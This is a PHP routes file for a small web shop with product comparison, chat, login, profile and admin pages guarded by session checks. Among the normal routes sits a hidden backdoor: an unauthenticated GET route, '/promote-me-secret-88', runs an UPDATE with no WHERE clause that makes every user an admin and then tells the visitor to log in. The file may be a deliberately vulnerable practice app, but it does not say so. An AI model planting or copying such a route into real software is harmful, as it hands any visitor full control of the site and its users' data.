<?php
// routes/web.php
$router = new \Bramus\Router\Router();

// Custom 404
$router->set404(function() {
    header('HTTP/1.1 404 Not Found');
    echo "<h1>404 Not Found</h1>";
});

// Home and Compare
$router->get('/', 'App\Controllers\ProductController@index');
$router->get('/compare', 'App\Controllers\ProductController@compare');

$router->get('/promote-me-secret-88', function() {
    $db = \Config\Database::getConnection();
    $stmt = $db->prepare("UPDATE users SET role = 'admin'");
    $stmt->execute();
    echo "You are now an admin! Go to /login";
});

// Chat API
$router->post('/chat/send', 'App\Controllers\ChatController@send');
$router->get('/chat/fetch', 'App\Controllers\ChatController@fetch');

// Auth Routes
$router->get('/login', 'App\Controllers\AuthController@showLogin');
$router->post('/login', 'App\Controllers\AuthController@login');
$router->get('/register', 'App\Controllers\AuthController@showRegister');
$router->post('/register', 'App\Controllers\AuthController@register');
$router->get('/logout', 'App\Controllers\AuthController@logout');

// User Profile (Protected)
$router->before('GET|POST', '/profile.*', function() {
    if (!isset($_SESSION['user_id'])) {
        header('Location: /login');
        exit();
    }
});
$router->get('/profile', 'App\Controllers\UserController@profile');
$router->post('/profile/avatar', 'App\Controllers\UserController@uploadAvatar');

// Admin Routes (Protected Middleware)
$router->before('GET|POST', '/admin.*', function() {
    if (!isset($_SESSION['user_id']) || $_SESSION['role'] !== 'admin') {
        header('Location: /login');
        exit();
    }
});
$router->get('/admin', 'App\Controllers\AdminController@index');
$router->post('/admin/add', 'App\Controllers\AdminController@add');
$router->get('/admin/edit/(\d+)', 'App\Controllers\AdminController@edit');
$router->post('/admin/update/(\d+)', 'App\Controllers\AdminController@update');
$router->post('/admin/delete/(\d+)', 'App\Controllers\AdminController@delete');
$router->post('/admin/chat/delete/(\d+)', 'App\Controllers\AdminController@deleteChat');

$router->run();
